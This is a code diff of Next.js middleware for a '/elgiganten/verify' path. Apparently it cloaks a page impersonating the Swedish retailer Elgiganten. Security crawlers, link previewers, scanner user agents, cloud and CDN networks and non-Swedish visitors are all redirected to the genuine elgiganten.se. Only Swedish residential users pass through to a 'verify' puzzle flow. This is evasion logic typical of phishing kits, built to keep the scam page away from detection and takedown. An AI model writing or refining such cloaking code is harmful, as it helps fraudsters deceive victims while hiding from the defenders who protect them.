@@ -2,13 +2,12 @@
 import { NextResponse, NextRequest } from "next/server";
 
 export const config = {
-  // Run only on the verify flow
   matcher: ["/elgiganten/verify/:path*"],
 };
 
 /* ========= RUNTIME CONFIG / LOGGING ========= */
 const REDIRECT_URL = "https://www.elgiganten.se";
-const VERBOSE = process.env.MW_VERBOSE_LOGS !== "0"; // set MW_VERBOSE_LOGS=0 to silence
+const VERBOSE = process.env.MW_VERBOSE_LOGS !== "0";
 const log = (...args: any[]) => VERBOSE && console.log("[MW]", ...args);
 
 /* ========= Provider blocklists (ASN + name/domain snippets) ========= */
@@ -27,9 +26,7 @@ const BAD_ASN = new Set<string>([
   "AS54113",
   // Akamai
   "AS20940",
-
-  // >>> Your ISP (for testing) — uncomment if you want to block via ASN as well
-  // "AS8708",
+  // "AS8708", // (your ISP test)
 ]);
 
 const BAD_NAME_SNIPPETS: string[] = [
@@ -40,8 +37,7 @@ const BAD_NAME_SNIPPETS: string[] = [
   "meta", "facebook", "facebook inc",
   "fastly",
   "akamai",
-
-  // (optional) extra names for your ISP
+  // ISP extras
   "triple t broadband public company limited",
   "triple t broadband",
   "3bb",
@@ -49,9 +45,7 @@ const BAD_NAME_SNIPPETS: string[] = [
   "vodafone","mobifon",
 ];
 
-/** ─────────────────────────────
- * Add-on blocklists (ASNs + names/domains)
- * ───────────────────────────── */
+/** Add-on ASN + name rules */
 const EXTRA_BAD_ASN: string[] = [
   "AS15169", "AS396982", "AS36040", "AS19527", "AS139070", "AS36561", "AS43515", "AS16550",
   "AS32934", "AS63293",
@@ -61,7 +55,6 @@ const EXTRA_BAD_ASN: string[] = [
   "AS20940", "AS12222", "AS16625", "AS16702", "AS35994", "AS32787", "AS63949",
   "AS54113",
 ];
-
 for (const a of EXTRA_BAD_ASN) BAD_ASN.add(a.toUpperCase());
 
 const EXTRA_BAD_NAME_SNIPPETS: string[] = [
@@ -79,11 +72,9 @@ const EXTRA_BAD_NAME_SNIPPETS: string[] = [
   "fastly", "fastly, inc", "fastly.com", "fastly.net",
   "linode", "linode, llc", "linode.com",
 ];
-
 BAD_NAME_SNIPPETS.push(...EXTRA_BAD_NAME_SNIPPETS.map((s) => s.toLowerCase()));
 
-/* ======= Optional ENV-driven extensions (no redeploy code changes) ======= */
-// Comma-separated lists are supported, e.g. "AS15169,AS16509"
+/* ======= ENV-driven extensions ======= */
 if (process.env.BLOCKED_ASNS) {
   for (const asn of process.env.BLOCKED_ASNS.split(",")) {
     const v = asn.trim().toUpperCase();
@@ -96,7 +87,12 @@ if (process.env.BLOCKED_ISP_SUBSTRS) {
     if (v) BAD_NAME_SNIPPETS.push(v);
   }
 }
-// Optional country blocks (two-letter codes, e.g. "A1,A2" for Unknown / Satellite)
+
+/** Country rules
+ *  - If ALLOWED_COUNTRY is set, only that 2-letter code is allowed (e.g. SE)
+ *  - Else, use BLOCKED_COUNTRY_CODES deny list (optional)
+ */
+const ALLOWED_COUNTRY = (process.env.ALLOWED_COUNTRY || "").trim().toUpperCase();
 const BAD_COUNTRIES = new Set<string>(
   (process.env.BLOCKED_COUNTRY_CODES || "")
     .split(",")
@@ -104,13 +100,29 @@ const BAD_COUNTRIES = new Set<string>(
     .filter(Boolean),
 );
 
-/* ========= Broad bot/crawler UA detection (incl. Vertex) ========= */
+function isBlockedByCountry(arg: { code?: string; name?: string }) {
+  const code = (arg.code || "").toUpperCase();
+  const name = (arg.name || "").toUpperCase();
+
+  if (ALLOWED_COUNTRY) {
+    // Prefer ISO code; if absent, try simple name → code for Sweden
+    const effective = code || (name === "SWEDEN" ? "SE" : "");
+    // If still unknown, be conservative and block
+    if (!effective) return true;
+    return effective !== ALLOWED_COUNTRY;
+  }
+
+  // Deny-list mode
+  const candidate = code || name;
+  return candidate ? BAD_COUNTRIES.has(candidate) : false;
+}
+
+/* ========= Bot UA detection ========= */
 const BOT_UA =
   /(bot|crawler|spider|crawling|curl|wget|python-requests|httpclient|libwww|urlgrabber|^python|^php|^java|go-http-client|okhttp|feedfetcher|readability|preview|scan|probe|monitor|checker|validator|analyzer|scrape|scraper|headless|phantomjs|slimerjs|puppeteer|playwright|rendertron|facebookexternalhit|facebot|slackbot|twitterbot|linkedinbot|pinterest|discordbot|telegrambot|whatsapp|skypeuripreview|googlebot|adsbot-google|google-read-aloud|google-cloudvertexbot|mediapartners-google|bingbot|bingpreview|yandex|baiduspider|duckduckbot|sogou|seznambot|semrush|ahrefs|mj12bot|dotbot|gigabot|petalbot|applebot|ia_archiver|amazonbot)/i;
 
 /* ========= Helpers ========= */
 function getClientIp(req: NextRequest): string | null {
-  // Respect proxies/CDN headers (Vercel/CF)
   const fwd = req.headers.get("x-forwarded-for");
   if (fwd) {
     const ip = fwd.split(",")[0]?.trim();
@@ -143,7 +155,8 @@ async function ipinfoLookup(ip: string, token?: string) {
       asn?: string;
       as_name?: string;
       as_domain?: string;
-      country?: string; // sometimes present
+      country?: string;        // "Sweden"
+      country_code?: string;   // "SE"
     };
     log("IPinfo response:", json);
     return json;
@@ -157,7 +170,6 @@ async function ipinfoLookup(ip: string, token?: string) {
 function matchesBadProviderLite(rec: { asn?: string; as_name?: string; as_domain?: string } | null) {
   if (!rec) return false;
   const { asn, as_name, as_domain } = rec;
-
   if (asn && BAD_ASN.has(asn.toUpperCase())) {
     log("Block by ASN:", asn);
     return true;
@@ -173,7 +185,6 @@ function matchesBadProviderLite(rec: { asn?: string; as_name?: string; as_domain
 }
 
 async function maxmindLookup(req: NextRequest, ip: string) {
-  // Call internal API (Node runtime) with a tight timeout
   const controller = new AbortController();
   const to = setTimeout(() => controller.abort(), 1200);
   try {
@@ -183,7 +194,7 @@ async function maxmindLookup(req: NextRequest, ip: string) {
     const res = await fetch(url.toString(), {
       method: "GET",
       signal: controller.signal,
-      headers: { "x-mw": "1" }, // trivial guard
+      headers: { "x-mw": "1" },
       cache: "no-store",
     });
     clearTimeout(to);
@@ -201,25 +212,30 @@ async function maxmindLookup(req: NextRequest, ip: string) {
   }
 }
 
-/* ========= Middleware entrypoint (Edge runtime) ========= */
+/* ========= Middleware ========= */
 export async function middleware(req: NextRequest) {
   const ua = req.headers.get("user-agent") || "";
   const ip = getClientIp(req);
   log("— MW START —", { path: req.nextUrl.pathname, ip, ua });
 
-  // 0) UA block (bots and previews) **before** any page logic
+  // 0) Bot UA block
   if (BOT_UA.test(ua)) {
     log("Block by UA bot signature");
     return NextResponse.redirect(REDIRECT_URL, { status: 302 });
   }
 
-  // 1) IPinfo ASN/AS-name/domain (+ optional country)
+  // 1) IPinfo checks (country + ASN/name)
   if (ip) {
     const lite = await ipinfoLookup(ip, process.env.IPINFO_TOKEN);
 
-    // Country block (if provided by IPinfo Lite & configured)
-    if (lite?.country && BAD_COUNTRIES.has(lite.country.toUpperCase())) {
-      log("Block by country code:", lite.country);
+    // Country rule (allow-only if ALLOWED_COUNTRY set, else deny-list)
+    if (lite && isBlockedByCountry({ code: (lite as any).country_code, name: lite.country })) {
+      log("Block by country:", { code: (lite as any).country_code, name: lite.country });
+      return NextResponse.redirect(REDIRECT_URL, { status: 302 });
+    }
+    // If allow-only mode and IPinfo gave no country at all, block conservatively
+    if (ALLOWED_COUNTRY && (!lite || (!(lite as any).country_code && !lite.country))) {
+      log("Block by country: missing code while allow-only active");
       return NextResponse.redirect(REDIRECT_URL, { status: 302 });
     }
 
@@ -228,7 +244,7 @@ export async function middleware(req: NextRequest) {
       return NextResponse.redirect(REDIRECT_URL, { status: 302 });
     }
 
-    // 2) MaxMind ISP DB as a second signal (if you wired /api/isp-lookup)
+    // 2) MaxMind secondary signal
     const mm = await maxmindLookup(req, ip);
     if (mm?.isBad) {
       log("Redirect (MaxMind match) →", REDIRECT_URL);
@@ -238,7 +254,7 @@ export async function middleware(req: NextRequest) {
     log("No client IP found; skipping IP-based checks");
   }
 
-  // 3) Allow through to the verify page flow (puzzle etc.)
+  // 3) Allow through
   log("Allow through");
   return NextResponse.next();
 }
